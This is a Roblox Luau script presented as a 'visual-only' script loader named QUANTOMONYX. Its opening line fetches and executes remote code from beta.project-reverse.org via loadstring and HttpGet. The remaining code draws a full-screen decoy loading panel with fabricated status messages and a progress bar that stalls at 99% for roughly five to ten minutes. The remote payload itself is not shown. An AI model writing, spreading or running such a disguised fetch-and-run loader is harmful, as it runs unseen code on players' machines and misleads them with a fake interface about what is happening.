ID="61d1faa8-d73f-40d8-8872-da8d5195c455";
RUN_AFTER=nil;
loadstring(game:HttpGet("https://beta.project-reverse.org/content/loader.luau"))();


--[[
    QUANTOMONYX v3.7.2
    ULTIMATE VISUAL LOADER
    VISUAL-ONLY INTERFACE
]]

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- SETTINGS
local LOAD_DURATION = 200
local HOLD_MIN = 300
local HOLD_MAX = 600
local SCALE = 0.84

-- CLEANUP
local old = playerGui:FindFirstChild("QuantomOnyx")
if old then old:Destroy() end

-- COLORS
local purple = Color3.fromRGB(165, 35, 255)
local bright = Color3.fromRGB(220, 145, 255)
local white = Color3.fromRGB(248, 240, 255)
local black = Color3.fromRGB(5, 3, 12)
local darkPurple = Color3.fromRGB(17, 6, 32)
local muted = Color3.fromRGB(185, 178, 205)

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "QuantomOnyx"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999
gui.Parent = playerGui

-- MAIN PANEL
local main = Instance.new("Frame")
main.Name = "MainPanel"
main.Size = UDim2.fromScale(0.96, 0.94)
main.Position = UDim2.fromScale(0.5, 0.5)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundColor3 = black
main.BorderSizePixel = 0
main.Parent = gui

local uiScale = Instance.new("UIScale")
uiScale.Scale = SCALE
uiScale.Parent = main

local constraint = Instance.new("UISizeConstraint")
constraint.MaxSize = Vector2.new(1400, 850)
constraint.MinSize = Vector2.new(320, 300)
constraint.Parent = main

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 18)
mainCorner.Parent = main

local mainGradient = Instance.new("UIGradient")
mainGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 7, 38)),
    ColorSequenceKeypoint.new(0.5, black),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 4, 24))
})
mainGradient.Rotation = 35
mainGradient.Parent = main

-- OUTER GLOW
local glow = Instance.new("UIStroke")
glow.Color = purple
glow.Thickness = 10
glow.Transparency = 0.72
glow.Parent = main

local outline = Instance.new("UIStroke")
outline.Color = bright
outline.Thickness = 2.5
outline.Parent = main

-- LABEL HELPER
local function makeLabel(name, pos, size, text, textSize, color, font)
    local label = Instance.new("TextLabel")
    label.Name = name
    label.Position = pos
    label.Size = size
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = color
    label.TextSize = textSize
    label.Font = font or Enum.Font.Gotham
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = main
    return label
end

-- CORNER ACCENTS
local function makeLine(parent, x, y, width, rotation)
    local line = Instance.new("Frame")
    line.AnchorPoint = Vector2.new(0, 0.5)
    line.Position = UDim2.new(x, 0, y, 0)
    line.Size = UDim2.new(width, 0, 0, 4)
    line.Rotation = rotation
    line.BackgroundColor3 = purple
    line.BorderSizePixel = 0
    line.Parent = parent

    local stroke = Instance.new("UIStroke")
    stroke.Color = bright
    stroke.Thickness = 1
    stroke.Parent = line

    return line
end

makeLine(main, 0.025, 0.035, 0.075, -45)
makeLine(main, 0.895, 0.035, 0.075, 45)
makeLine(main, 0.025, 0.965, 0.075, 45)
makeLine(main, 0.895, 0.965, 0.075, -45)

-- ANIMATED BORDER
task.spawn(function()
    while gui.Parent do
        TweenService:Create(outline, TweenInfo.new(1.5),
            {Color = bright}):Play()
        TweenService:Create(glow, TweenInfo.new(1.5),
            {Transparency = 0.4}):Play()

        task.wait(1.5)

        TweenService:Create(outline, TweenInfo.new(1.5),
            {Color = purple}):Play()
        TweenService:Create(glow, TweenInfo.new(1.5),
            {Transparency = 0.75}):Play()

        task.wait(1.5)
    end
end)

-- LOGO
local logoBox = Instance.new("Frame")
logoBox.Size = UDim2.fromOffset(64, 64)
logoBox.Position = UDim2.new(0.055, 0, 0.025, 0)
logoBox.BackgroundColor3 = darkPurple
logoBox.BorderSizePixel = 0
logoBox.Parent = main

local logoCorner = Instance.new("UICorner")
logoCorner.CornerRadius = UDim.new(0, 14)
logoCorner.Parent = logoBox

local logoStroke = Instance.new("UIStroke")
logoStroke.Color = purple
logoStroke.Thickness = 2
logoStroke.Parent = logoBox

local logo = Instance.new("TextLabel")
logo.Size = UDim2.fromScale(1, 1)
logo.BackgroundTransparency = 1
logo.Text = "Q"
logo.TextColor3 = bright
logo.TextSize = 46
logo.Font = Enum.Font.GothamBlack
logo.Parent = logoBox

-- HEADER
makeLabel(
    "Title",
    UDim2.new(0.19, 0, 0.025, 0),
    UDim2.new(0.62, 0, 0, 58),
    "QUANTOMONYX",
    39,
    white,
    Enum.Font.GothamBlack
)

makeLabel(
    "Subtitle",
    UDim2.new(0.19, 0, 0.105, 0),
    UDim2.new(0.68, 0, 0, 30),
    "U L T I M A T E   S C R I P T   L O A D E R",
    17,
    bright,
    Enum.Font.GothamBold
)

local version = makeLabel(
    "Version",
    UDim2.new(0.82, 0, 0.045, 0),
    UDim2.new(0.13, 0, 0, 35),
    "v3.7.2",
    21,
    white,
    Enum.Font.GothamBold
)
version.TextXAlignment = Enum.TextXAlignment.Center

-- HEADER LINE
local headerLine = Instance.new("Frame")
headerLine.Size = UDim2.new(0.92, 0, 0, 3)
headerLine.Position = UDim2.new(0.04, 0, 0.19, 0)
headerLine.BackgroundColor3 = purple
headerLine.BorderSizePixel = 0
headerLine.Parent = main

-- PIRATE ARTWORK PANEL
local artwork = Instance.new("Frame")
artwork.Name = "ArtworkPanel"
artwork.Size = UDim2.new(0.29, 0, 0.49, 0)
artwork.Position = UDim2.new(0.025, 0, 0.22, 0)
artwork.BackgroundColor3 = darkPurple
artwork.BorderSizePixel = 0
artwork.ClipsDescendants = true
artwork.Parent = main

local artCorner = Instance.new("UICorner")
artCorner.CornerRadius = UDim.new(0, 15)
artCorner.Parent = artwork

local artStroke = Instance.new("UIStroke")
artStroke.Color = purple
artStroke.Thickness = 2.5
artStroke.Parent = artwork

local artworkImage = Instance.new("ImageLabel")
artworkImage.Name = "PirateArtwork"
artworkImage.Size = UDim2.fromScale(1, 1)
artworkImage.BackgroundTransparency = 1
artworkImage.Image = "rbxassetid://99927109751894"
artworkImage.ScaleType = Enum.ScaleType.Crop
artworkImage.Parent = artwork

local imageCorner = Instance.new("UICorner")
imageCorner.CornerRadius = UDim.new(0, 15)
imageCorner.Parent = artworkImage

-- ARTWORK CAPTION
local artCaption = Instance.new("TextLabel")
artCaption.Name = "ArtworkCaption"
artCaption.Size = UDim2.new(1, -16, 0, 35)
artCaption.Position = UDim2.new(0, 8, 1, -43)
artCaption.BackgroundColor3 = black
artCaption.BackgroundTransparency = 0.2
artCaption.Text = "THE CROWNED PIRATE"
artCaption.TextColor3 = bright
artCaption.TextSize = 15
artCaption.Font = Enum.Font.GothamBold
artCaption.Parent = artwork

local captionCorner = Instance.new("UICorner")
captionCorner.CornerRadius = UDim.new(0, 8)
captionCorner.Parent = artCaption

-- DIVIDER
local divider = Instance.new("Frame")
divider.Size = UDim2.new(0, 3, 0.43, 0)
divider.Position = UDim2.new(0.325, 0, 0.25, 0)
divider.BackgroundColor3 = purple
divider.BorderSizePixel = 0
divider.Parent = main

-- INITIALIZATION HEADING
makeLabel(
    "InitializationHeading",
    UDim2.new(0.35, 0, 0.23, 0),
    UDim2.new(0.63, 0, 0, 35),
    "Initializing advanced visual modules...",
    18,
    white,
    Enum.Font.Code
)

-- STATUS MESSAGES
local messages = {
    "> Initializing visual framework...",
    "> Preparing interface components...",
    "> Building neon rendering layers...",
    "> Synchronizing visual elements...",
    "> Loading interface textures...",
    "> Calibrating purple energy effects...",
    "> Preparing pirate artwork display...",
    "> Optimizing interface animations...",
    "> Connecting visual components...",
    "> Adjusting interface proportions...",
    "> Rendering holographic elements...",
    "> Preparing progress animation...",
    "> Synchronizing interface panels...",
    "> Polishing neon border effects...",
    "> Finalizing visual configuration...",
    "> Checking interface consistency...",
    "> Preparing final presentation...",
    "> Applying cinematic lighting...",
    "> Optimizing graphical elements...",
    "> Refreshing interface details...",
    "> Calibrating animation timing...",
    "> Completing visual preparation...",
    "> Finalizing QUANTOMONYX interface...",
    "> Almost ready...",
    "> Visual initialization complete..."
}

local status = makeLabel(
    "InitializationLogs",
    UDim2.new(0.35, 0, 0.31, 0),
    UDim2.new(0.64, 0, 0.35, 0),
    "",
    18,
    purple,
    Enum.Font.Code
)

status.TextYAlignment = Enum.TextYAlignment.Top

-- PROGRESS BACKGROUND
local barBG = Instance.new("Frame")
barBG.Name = "ProgressBackground"
barBG.Size = UDim2.new(0.80, 0, 0, 44)
barBG.Position = UDim2.new(0.04, 0, 0.70, 0)
barBG.BackgroundColor3 = Color3.fromRGB(22, 8, 39)
barBG.BorderSizePixel = 0
barBG.ClipsDescendants = true
barBG.Parent = main

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(1, 0)
barCorner.Parent = barBG

local barStroke = Instance.new("UIStroke")
barStroke.Color = purple
barStroke.Thickness = 3
barStroke.Parent = barBG

-- PROGRESS FILL
local bar = Instance.new("Frame")
bar.Name = "ProgressFill"
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = purple
bar.BorderSizePixel = 0
bar.ClipsDescendants = true
bar.Parent = barBG

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(1, 0)
fillCorner.Parent = bar

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(95, 0, 220)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(210, 100, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(105, 0, 230))
})
gradient.Parent = bar

-- MOVING STRIPES
local stripeFolder = Instance.new("Frame")
stripeFolder.Size = UDim2.fromScale(1, 1)
stripeFolder.BackgroundTransparency = 1
stripeFolder.Parent = bar

for i = 0, 40 do
    local stripe = Instance.new("Frame")
    stripe.Size = UDim2.new(0, 12, 2, 0)
    stripe.Position = UDim2.new(0, i * 30, -0.5, 0)
    stripe.Rotation = 40
    stripe.BackgroundColor3 = Color3.fromRGB(240, 190, 255)
    stripe.BackgroundTransparency = 0.42
    stripe.BorderSizePixel = 0
    stripe.Parent = stripeFolder
end

task.spawn(function()
    while gui.Parent do
        for _, stripe in ipairs(stripeFolder:GetChildren()) do
            if stripe:IsA("Frame") then
                stripe.Position = stripe.Position - UDim2.new(0, 1, 0, 0)

                if stripe.Position.X.Offset < -25 then
                    stripe.Position = UDim2.new(
                        0,
                        bar.AbsoluteSize.X + math.random(20, 100),
                        -0.5,
                        0
                    )
                end
            end
        end
        task.wait(0.025)
    end
end)

-- PERCENTAGE
local percent = makeLabel(
    "Percentage",
    UDim2.new(0.85, 0, 0.685, 0),
    UDim2.new(0.13, 0, 0, 55),
    "0%",
    40,
    white,
    Enum.Font.GothamBlack
)
percent.TextXAlignment = Enum.TextXAlignment.Center

-- SEPARATOR
local separator = Instance.new("Frame")
separator.Size = UDim2.new(0.92, 0, 0, 3)
separator.Position = UDim2.new(0.04, 0, 0.82, 0)
separator.BackgroundColor3 = purple
separator.BorderSizePixel = 0
separator.Parent = main

-- SPINNER
local spinner = makeLabel(
    "Spinner",
    UDim2.new(0.06, 0, 0.84, 0),
    UDim2.fromOffset(65, 65),
    "◌",
    62,
    bright,
    Enum.Font.Gotham
)

task.spawn(function()
    while gui.Parent do
        local tween = TweenService:Create(
            spinner,
            TweenInfo.new(0.65, Enum.EasingStyle.Linear),
            {Rotation = spinner.Rotation + 180}
        )
        tween:Play()
        tween.Completed:Wait()
    end
end)

-- BOTTOM STATUS
local bottom = makeLabel(
    "BottomStatus",
    UDim2.new(0.16, 0, 0.85, 0),
    UDim2.new(0.76, 0, 0, 30),
    "Preparing visual interface...",
    18,
    purple,
    Enum.Font.Code
)

local hint = makeLabel(
    "Hint",
    UDim2.new(0.16, 0, 0.91, 0),
    UDim2.new(0.76, 0, 0, 25),
    "Please wait while the visual interface initializes.",
    14,
    muted,
    Enum.Font.Code
)

-- VISUAL LOADING SEQUENCE
local startTime = os.clock()
local lastMessageIndex = 0

while gui.Parent do
    local elapsed = os.clock() - startTime
    local progress = math.min(elapsed / LOAD_DURATION, 1)
    local currentPercent = math.min(math.floor(progress * 99), 99)

    -- Update bar and percentage
    bar.Size = UDim2.new(progress * 0.99, 0, 1, 0)
    percent.Text = currentPercent .. "%"

    -- New message every 8 seconds
    local messageIndex = math.min(
        math.floor(elapsed / 8) + 1,
        #messages
    )

    if messageIndex ~= lastMessageIndex then
        lastMessageIndex = messageIndex

        local visibleMessages = {}
        local firstMessage = math.max(1, messageIndex - 5)

        for i = firstMessage, messageIndex do
            table.insert(visibleMessages, messages[i])
        end

        status.Text = table.concat(visibleMessages, "\n")
        bottom.Text = messages[messageIndex]:gsub("> ", "")
    end

    if progress >= 1 then
        break
    end

    task.wait(0.03)
end

-- 99% HOLD
if gui.Parent then
    percent.Text = "99%"
    bar.Size = UDim2.new(0.99, 0, 1, 0)

    bottom.Text = "Finalizing visual presentation..."

    local duration = math.random(HOLD_MIN, HOLD_MAX)
    local holdStart = os.clock()

    while os.clock() - holdStart < duration and gui.Parent do
        for _, message in ipairs(messages) do
            if os.clock() - holdStart >= duration then
                break
            end

            bottom.Text = message:gsub("> ", "")
            task.wait(2)
        end
    end

    -- VISUAL COMPLETION
    if gui.Parent then
        local completeTween = TweenService:Create(
            bar,
            TweenInfo.new(
                1.2,
                Enum.EasingStyle.Quart,
                Enum.EasingDirection.Out
            ),
            {Size = UDim2.new(1, 0, 1, 0)}
        )

        completeTween:Play()

        percent.Text = "100%"
        bottom.Text = "VISUAL INITIALIZATION COMPLETE"
        hint.Text = "QUANTOMONYX INTERFACE READY"

        task.wait(3)

        gui:Destroy()
    end
end
